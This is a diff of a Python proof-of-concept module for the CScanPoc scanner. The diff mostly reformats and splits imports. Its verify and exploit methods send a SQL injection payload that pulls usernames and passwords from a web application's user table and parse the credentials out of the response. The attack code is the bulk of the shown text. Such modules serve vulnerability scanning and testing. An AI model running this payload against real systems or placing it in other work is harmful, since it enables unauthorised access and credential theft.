@@ -2,8 +2,12 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request, urllib.parse, urllib.error
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.parse
+import urllib.error
+import urllib.request
+import urllib.error
+import urllib.parse
 import re
 
 
@@ -42,9 +46,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -52,7 +57,8 @@ class Poc(ABPoc):
                        "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8,9,10,11,12,13,"
                        "14,15,16/**/from/**/user/**/limit/**/0,1%23")
             verify_url = '{target}'.format(target=self.target)+payload
-            content = urllib.request.urlopen(urllib.request.Request(verify_url)).read()
+            content = urllib.request.urlopen(
+                urllib.request.Request(verify_url)).read()
             pattern = re.compile(r".*?<id>\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*</id>",
                                  re.I | re.S)  # 忽略大小写、单行模式
             match = pattern.match(content)
@@ -65,7 +71,8 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                 target=self.target, vuln=self.vuln))
@@ -74,7 +81,8 @@ class Poc(ABPoc):
                        "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8,9,10,11,12,13,"
                        "14,15,16/**/from/**/user/**/limit/**/0,1%23")
             verify_url = '{target}'.format(target=self.target)+payload
-            content = urllib.request.urlopen(urllib.request.Request(verify_url)).read()
+            content = urllib.request.urlopen(
+                urllib.request.Request(verify_url)).read()
             pattern = re.compile(r".*?<id>\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*</id>",
                                  re.I | re.S)  # 忽略大小写、单行模式
             match = pattern.match(content)
